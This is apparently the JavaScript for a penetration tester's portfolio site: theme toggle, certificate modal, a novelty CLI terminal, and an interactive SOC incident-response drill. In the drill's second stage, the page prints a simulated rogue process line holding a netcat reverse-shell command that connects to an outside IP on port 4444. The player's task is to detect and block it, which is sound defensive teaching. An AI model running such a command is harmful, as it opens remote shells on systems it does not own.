// 1. THEME TOGGLE
(() => {
  const storageKey = 'portfolio-theme';
  const root = document.documentElement;
  const toggle = document.querySelector('.theme-toggle');

  function applyTheme(theme) {
    root.dataset.theme = theme;
    const isDark = theme === 'dark';
    document.querySelector('meta[name="theme-color"]')?.setAttribute('content', isDark ? '#0b0c10' : '#f6f6f4');
    if (toggle) {
      toggle.setAttribute('aria-pressed', String(isDark));
      toggle.setAttribute('aria-label', `Switch to ${isDark ? 'light' : 'dark'} theme`);
      toggle.innerHTML = `<i class="fa-solid fa-${isDark ? 'sun' : 'moon'}" aria-hidden="true"></i>`;
    }
  }

  applyTheme(root.dataset.theme || 'dark');

  toggle?.addEventListener('click', () => {
    const nextTheme = root.dataset.theme === 'dark' ? 'light' : 'dark';
    localStorage.setItem(storageKey, nextTheme);
    applyTheme(nextTheme);
  });
})();

// 2. SCROLL-TO-TOP BUTTON
(() => {
  const scrollTopBtn = document.querySelector('.scroll-top');
  if (!scrollTopBtn) return;

  const updateVisibility = () => {
    const visible = window.scrollY > 320;
    scrollTopBtn.classList.toggle('is-visible', visible);
    scrollTopBtn.setAttribute('aria-hidden', String(!visible));
    scrollTopBtn.tabIndex = visible ? 0 : -1;
  };

  scrollTopBtn.addEventListener('click', () => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });

  window.addEventListener('scroll', updateVisibility, { passive: true });
  updateVisibility();
})();

// 3. CERTIFICATE MODAL (Accessible)
(() => {
  const modal = document.getElementById('cert-modal');
  const viewer = document.getElementById('cert-viewer');
  const titleEl = document.getElementById('cert-modal-title');
  const downloadBtn = document.getElementById('cert-download-btn');
  const closeBtn = modal?.querySelector('.cert-close-btn');

  if (!modal || !viewer || !titleEl || !downloadBtn) return;

  function openModal(certUrl, skillTitle) {
    titleEl.textContent = `${skillTitle} — Verified Certificate`;
    viewer.src = certUrl;
    downloadBtn.href = certUrl;
    downloadBtn.setAttribute('download', `${skillTitle.replace(/\s+/g, '_')}_Certificate.pdf`);
    modal.hidden = false;
    closeBtn?.focus();
  }

  function closeModal() {
    modal.hidden = true;
    viewer.src = '';
  }

  document.querySelectorAll('.skill-chip.has-cert').forEach((btn) => {
    btn.addEventListener('click', () => {
      const url = btn.dataset.cert;
      const title = btn.dataset.title || 'Skill';
      if (url) openModal(url, title);
    });
  });

  closeBtn?.addEventListener('click', closeModal);
  modal.addEventListener('click', (e) => {
    if (e.target === modal) closeModal();
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && !modal.hidden) closeModal();
  });
})();

// 4. INTERACTIVE CLI TERMINAL
(() => {
  const input = document.getElementById('terminal-input');
  const output = document.getElementById('terminal-output');
  if (!input || !output) return;

  const LINKS = {
    github: 'https://github.com/sac-exe',
    linkedin: 'https://www.linkedin.com/in/sachin-sac/',
    tryhackme: 'https://tryhackme.com/p/sac007',
    email: 'mailto:sachinjrwork@gmail.com',
    resume: '/assets/doc/Sachin_Resume.pdf'
  };

  const COMMANDS = {
    help: `Available commands:<br>
      • <strong>whoami</strong> — Profile summary<br>
      • <strong>skills</strong> — Core offensive &amp; dev stack<br>
      • <strong>projects</strong> — Jump to featured projects<br>
      • <strong>github</strong> / <strong>linkedin</strong> / <strong>tryhackme</strong> — Open profiles<br>
      • <strong>resume</strong> — Download PDF resume<br>
      • <strong>contact</strong> — Jump to contact form<br>
      • <strong>flag</strong> — Capture the hidden flag<br>
      • <strong>clear</strong> — Clear screen`,
    whoami: 'Sachin.J — BCA Graduate & Penetration Tester trained at Offenso Hackers Academy.',
    skills: 'Burp Suite, Nmap, Hydra, SQLi, Linux, Python, Node.js, React, SQL, Git.',
    flag: 'FLAG{cl34n_c0d3_and_sh4rp_r3c0n_2026}'
  };

  function appendLine(html) {
    const div = document.createElement('div');
    div.style.marginBottom = '8px';
    div.innerHTML = html;
    output.appendChild(div);
    output.scrollTop = output.scrollHeight;
  }

  input.addEventListener('keydown', (e) => {
    if (e.key !== 'Enter') return;
    const raw = input.value.trim();
    const cmd = raw.toLowerCase();
    input.value = '';
    if (!cmd) return;

    if (cmd === 'clear') {
      output.innerHTML = '';
      return;
    }

    appendLine(`<span style="color:#05ffa1;">guest@sac:~$</span> ${raw.replace(/</g, '&lt;')}`);

    if (LINKS[cmd]) {
      if (cmd === 'resume') {
        const a = document.createElement('a');
        a.href = LINKS.resume;
        a.download = 'Sachin_Resume.pdf';
        a.click();
        appendLine('Downloading Sachin_Resume.pdf...');
      } else if (cmd === 'email') {
        window.location.href = LINKS.email;
        appendLine('Opening mail client...');
      } else {
        window.open(LINKS[cmd], '_blank', 'noopener');
        appendLine(`Opened ${cmd} in a new tab.`);
      }
      return;
    }

    if (cmd === 'projects') {
      document.getElementById('work')?.scrollIntoView({ behavior: 'smooth' });
      appendLine('Scrolling to Featured Projects...');
      return;
    }

    if (cmd === 'contact') {
      document.getElementById('contact')?.scrollIntoView({ behavior: 'smooth' });
      appendLine('Scrolling to Contact Form...');
      return;
    }

    if (COMMANDS[cmd]) {
      appendLine(COMMANDS[cmd]);
    } else {
      appendLine(`Command not found: <strong>${raw.replace(/</g, '&lt;')}</strong>. Type <strong>help</strong>.`);
    }
  });
})();

// 5. SOC CRISIS SIMULATOR
(() => {
  const socTerminal = document.getElementById('soc-terminal');
  const socControls = document.getElementById('soc-controls');
  const socSubsystem = document.getElementById('soc-subsystem');
  const socIndicator = document.getElementById('soc-indicator');
  const socStatusText = document.getElementById('soc-status-text');
  const socTimer = document.getElementById('soc-timer');
  const socHealth = document.getElementById('soc-health');
  const socStartBtn = document.getElementById('soc-start-btn');

  if (!socTerminal || !socStartBtn) return;

  let health = 100;
  let timeLeft = 180;
  let timerInterval = null;

  function log(msg, cls = '') {
    const p = document.createElement('p');
    if (cls) p.className = cls;
    p.innerHTML = msg;
    socTerminal.appendChild(p);
    socTerminal.scrollTop = socTerminal.scrollHeight;
  }

  function updateHealth(delta) {
    health = Math.max(0, health + delta);
    socHealth.textContent = `${health}%`;
    if (health === 0) {
      endGame(false, 'CRITICAL SYSTEM COLLAPSE: Host compromised.');
    }
  }

  function startTimer() {
    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
      timeLeft--;
      const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
      const s = String(timeLeft % 60).padStart(2, '0');
      socTimer.textContent = `${m}:${s}`;
      if (timeLeft <= 0) {
        endGame(false, 'TIME EXPIRED: Data exfiltration completed.');
      }
    }, 1000);
  }

  function endGame(won, message) {
    clearInterval(timerInterval);
    socIndicator.classList.remove('alert');
    socStatusText.textContent = won ? 'STATUS: THREAT CONTAINED' : 'STATUS: BREACH FAILED';
    log(message, won ? 'sys-success' : 'sys-err');
    if (won) {
      log(`Final Integrity: ${health}% | Time Remaining: ${socTimer.textContent}`, 'sys-success');
    }
    socSubsystem.innerHTML = `<p class="${won ? 'sys-success' : 'sys-err'}">${won ? 'All malicious sockets severed.' : 'Incident drill failed.'}</p>`;
    socControls.innerHTML = '';
    const retryBtn = document.createElement('button');
    retryBtn.type = 'button';
    retryBtn.className = 'button primary btn-sm';
    retryBtn.textContent = 'Run Drill Again';
    retryBtn.addEventListener('click', startSimulation);
    socControls.appendChild(retryBtn);
  }

  function loadStage1() {
    log('ALERT: Anomalous outbound traffic spike on web-server-01 (10.0.4.12).', 'sys-warn');
    log('Select initial triage step:');
    socSubsystem.innerHTML = '<p class="sys-msg">Awaiting analyst action...</p>';
    socControls.innerHTML = `
      <button type="button" class="soc-opt-btn" data-act="inspect">1. Open live process shell on web-server-01</button>
      <button type="button" class="soc-opt-btn" data-act="isolate">2. Quarantine host first (-15% uptime SLA)</button>
      <button type="button" class="soc-opt-btn" data-act="ignore">3. Dismiss alert as false positive</button>
    `;
    socControls.querySelectorAll('button').forEach((btn) => {
      btn.addEventListener('click', () => {
        const act = btn.dataset.act;
        if (act === 'ignore') {
          updateHealth(-100);
        } else if (act === 'isolate') {
          updateHealth(-15);
          log('Host quarantined. Moving to process inspection...', 'sys-warn');
          loadStage2();
        } else {
          log('Live shell connected. Inspecting active processes...', 'sys-success');
          loadStage2();
        }
      });
    });
  }

  function loadStage2() {
    log('STAGE 2: Run <code>ps aux</code> to identify the rogue process.');
    socSubsystem.innerHTML = `
      <label for="soc-cli">soc-analyst@web-01:~$ </label>
      <input type="text" id="soc-cli" class="soc-interactive-input" placeholder="Type ps aux and press Enter" autocomplete="off" />
    `;
    socControls.innerHTML = '';
    const cli = document.getElementById('soc-cli');
    cli?.focus();
    cli?.addEventListener('keydown', (e) => {
      if (e.key !== 'Enter') return;
      if (cli.value.trim().toLowerCase() === 'ps aux') {
        log('www-data  4821  98.2  /bin/nc -e /bin/bash 185.220.101.5 4444', 'sys-err');
        log('Reverse shell identified on PID 4821 -> outbound port 4444.', 'sys-success');
        loadStage3();
      } else {
        log('Invalid command. Hint: type <code>ps aux</code>', 'sys-err');
      }
    });
  }

  function loadStage3() {
    log('STAGE 3: Toggle and block the C2 port in the firewall.');
    socSubsystem.innerHTML = `
      <div class="port-grid">
        <button type="button" class="port-btn" data-port="80">Port 80 (HTTP)</button>
        <button type="button" class="port-btn" data-port="443">Port 443 (HTTPS)</button>
        <button type="button" class="port-btn" data-port="22">Port 22 (SSH)</button>
        <button type="button" class="port-btn" data-port="4444">Port 4444 (UNKNOWN)</button>
      </div>
    `;
    socSubsystem.querySelectorAll('.port-btn').forEach((btn) => {
      btn.addEventListener('click', () => btn.classList.toggle('blocked'));
    });

    socControls.innerHTML = '<button type="button" id="apply-fw" class="button primary btn-sm">Apply Firewall Policy</button>';
    document.getElementById('apply-fw')?.addEventListener('click', () => {
      const p4444 = socSubsystem.querySelector('[data-port="4444"]');
      const legitimateBlocked = ['80', '443', '22'].some((p) =>
        socSubsystem.querySelector(`[data-port="${p}"]`)?.classList.contains('blocked')
      );

      if (legitimateBlocked) {
        updateHealth(-25);
        log('WARNING: You blocked a legitimate production service port (-25% integrity).', 'sys-warn');
      }

      if (p4444?.classList.contains('blocked')) {
        endGame(true, 'SUCCESS: Outbound C2 tunnel on Port 4444 blocked.');
      } else {
        updateHealth(-35);
        log('ERROR: Port 4444 is still open! Exfiltration continuing (-35% integrity).', 'sys-err');
      }
    });
  }

  function startSimulation() {
    health = 100;
    timeLeft = 180;
    socHealth.textContent = '100%';
    socTimer.textContent = '03:00';
    socIndicator.classList.add('alert');
    socStatusText.textContent = 'STATUS: INCIDENT ACTIVE';
    socTerminal.innerHTML = '';
    startTimer();
    loadStage1();
  }

  socStartBtn.addEventListener('click', startSimulation);
})();